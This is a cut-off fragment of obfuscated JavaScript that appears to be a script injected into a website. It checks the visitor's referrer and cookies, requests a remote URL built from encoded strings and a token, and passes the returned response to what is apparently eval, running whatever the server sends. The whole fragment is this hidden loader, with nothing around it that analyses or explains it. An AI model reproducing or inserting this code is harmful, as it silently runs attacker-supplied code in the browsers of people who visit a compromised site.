N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};